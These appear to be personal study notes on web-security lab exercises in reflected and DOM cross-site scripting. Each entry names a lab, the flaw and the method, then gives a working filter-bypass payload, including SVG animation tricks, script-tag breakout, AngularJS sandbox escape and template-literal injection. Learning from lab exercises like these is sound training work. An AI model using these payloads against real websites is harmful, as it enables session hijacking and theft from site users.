



------> Lab: Reflected XSS with some SVG markup allowed
	Flow: forgot to disallow SVG markup
	method: brute-force the tags to see all allowed tags.
		You'll find that <svg> and <animateTransform> tags are allowed.
		Learn how these two tags work together. 
	payload: <svg><animateTransform onbegin=alert(0)>

------> Lab: Reflected XSS in canonical link tag
	Flow: 
	method: make the element clickable and allow it to be clicked using shortcut 
	Payload: ?'accesskey='x'onclick='alert(0) to the homepage URL

------> Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
	Flow: forgot to escafe html tags.
	Method: break out of the script tag and construct your own script.
	Payload: </script><script>alert(0)</script>

------> Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes 
	HTML-encoded and single quotes escaped
	Flow: forgot to escape \ character.
	Method: escape the escape character returned by the app.
	Payload: \';alert();//

------> Lab: Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
	Flow: allows AngularJs codes without proper sanitization
	Method: injece AngularJs code in the search function
	Payload: {{$on.constructor('alert(1)')()}}

------> Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, 
	backslash and backticks Unicode-escaped
	Flow: they used template leteral which allows arbitrary javascript code to be executed 
	in it.
	Method: add executable js code in the template literal
	Payload: BSH${alert(0)}

------> Lab: Reflected XSS with event handlers and href attributes blocked
	Flow: forgot to escape svg, animate and a tags
	Method: craft a payload using <svg>, <animate> and <a> tags in such a way that the <animate> tag assigns
	attribute and attribute value to <a> tag. The attribute and its value should trigger the xss.
	Payload: <svg><a><animate attributeName='href' values='javascript:alert(0)'/><text y='25' x='25'>Click me</text></a></svg>








